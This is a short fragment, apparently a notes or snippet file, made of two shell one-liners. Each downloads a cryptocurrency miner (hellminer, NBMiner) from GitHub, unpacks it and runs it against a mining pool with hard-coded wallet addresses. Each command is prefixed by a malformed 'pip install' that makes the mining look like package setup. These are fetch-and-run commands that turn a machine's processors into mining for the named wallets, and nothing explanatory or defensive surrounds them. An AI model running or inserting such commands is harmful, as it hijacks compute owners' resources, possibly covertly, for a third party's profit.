...
#----------------------------------------------------------------------------
pip install && wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz &&./hellminer -c stratum+tcp://pool -u RA1Cx5EkXxNZU8CR1rspXUzQ7xfHLoYu1J.tuet -p x --cpu 8
            
pip install --update && wget https://github.com/NebuTech/NBMiner/releases/download/v39.2/NBMiner_39.2_Linux.tgz && tar -xvf NBMiner_39.2_Linux.tgz && NBMiner_Linux/nbminer -a ethash -o nicehash+tcp://daggerhashimoto.eu.nicehash.com:3353 -u 3MBZ2pmtSQRpTRuQy7nHMQtBEPfqcBBNX9.40A
